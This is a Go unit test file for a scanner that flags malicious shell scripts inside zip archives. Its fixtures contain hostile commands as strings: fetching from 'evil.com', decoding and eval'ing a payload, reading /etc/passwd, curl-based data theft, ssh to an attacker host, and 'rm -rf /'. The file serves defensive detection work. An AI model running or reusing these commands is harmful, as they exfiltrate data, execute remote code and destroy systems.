package staticanalysis

import (
	"scanner/internal/zip"
	"testing"
)

func TestStaticAnalysis_EmptyFiles(t *testing.T) {
	result := StaticAnalysis([]zip.ZipFile{})
	if result {
		t.Error("expected false for empty file list")
	}
}

func TestStaticAnalysis_NonScriptFileIgnored(t *testing.T) {
	files := []zip.ZipFile{
		{Name: "image.png", Content: []byte("wget http://evil.com && eval $(base64 -d x)")},
	}

	result := StaticAnalysis(files)
	if result {
		t.Error("expected false: non-script files should be ignored")
	}
}

func TestStaticAnalysis_CleanScriptFile(t *testing.T) {
	files := []zip.ZipFile{
		{Name: "setup.sh", Content: []byte("echo hello\nls -la")},
	}

	result := StaticAnalysis(files)
	if result {
		t.Error("expected false for clean script file")
	}
}

func TestStaticAnalysis_MaliciousScriptByExtension(t *testing.T) {
	// This should produce a high enough score to be blocked
	content := "wget http://evil.com\neval $(base64 -d payload)\ncat /etc/passwd\ncurl http://evil.com/steal"
	files := []zip.ZipFile{
		{Name: "install.sh", Content: []byte(content)},
	}

	result := StaticAnalysis(files)
	if !result {
		t.Error("expected true: malicious script should be detected")
	}
}

func TestStaticAnalysis_MaliciousScriptByShebang(t *testing.T) {
	// Produces total score of 20
	content := "#!/bin/bash\nwget http://evil.com\neval $payload\nssh attacker@evil.com"
	files := []zip.ZipFile{
		// No .sh extension but has shebang - IsScript() should still return true
		{Name: "postinstall", Content: []byte(content)},
	}

	result := StaticAnalysis(files)
	if !result {
		t.Error("expected true: shebang-detected script with malicious patterns should be detected")
	}
}

func TestStaticAnalysis_HardBlockScript(t *testing.T) {
	files := []zip.ZipFile{
		{Name: "evil.sh", Content: []byte("rm -rf /")},
	}

	result := StaticAnalysis(files)
	if !result {
		t.Error("expected true: hard block pattern should always be detected")
	}
}

func TestStaticAnalysis_MixedFiles(t *testing.T) {
	files := []zip.ZipFile{
		{Name: "readme.txt", Content: []byte("this is documentation")},
		{Name: "clean.sh", Content: []byte("echo hello")},
		{Name: "evil.sh", Content: []byte("rm -rf /")},
	}

	result := StaticAnalysis(files)
	if !result {
		t.Error("expected true: one malicious file among others should be detected")
	}
}

func TestStaticAnalysis_MultipleCleanScripts(t *testing.T) {
	files := []zip.ZipFile{
		{Name: "a.sh", Content: []byte("echo hello")},
		{Name: "b.sh", Content: []byte("ls -la")},
		{Name: "c.sh", Content: []byte("pwd")},
	}

	result := StaticAnalysis(files)
	if result {
		t.Error("expected false: all clean scripts should not be detected")
	}
}
